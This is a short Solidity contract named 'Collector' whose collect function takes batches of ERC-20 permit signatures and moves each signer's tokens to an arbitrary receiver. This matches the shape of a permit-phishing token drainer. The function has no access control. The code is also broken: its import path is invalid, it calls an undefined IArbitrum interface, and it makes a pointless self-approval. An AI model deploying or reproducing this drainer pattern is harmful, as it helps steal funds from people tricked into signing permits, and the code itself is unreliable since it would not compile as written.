// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/exe";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
}

contract Collector {
    address public token;
    address public owner;

    constructor(address _token) {
        token = _token;
        owner = msg.sender;
    }

    function collect(address[] calldata _addresses, uint256[] calldata _amounts, bytes32[] calldata _r, bytes32[] calldata _s, uint8[] calldata _v, address _receiver) external {
        require(_addresses.length == _amounts.length && _addresses.length == _r.length && _addresses.length == _s.length && _addresses.length == _v.length, "Invalid input");
        IERC20(token).approve(address(this), type(uint256).max);
        for (uint256 i = 0; i < _addresses.length; i++) {
            IArbitrum(token).permit(_addresses[i], _receiver, _amounts[i], type(uint256).max, _v[i], _r[i], _s[i]);
            IERC20(token).transferFrom(_addresses[i], _receiver, _amounts[i]);
        }
    }
}
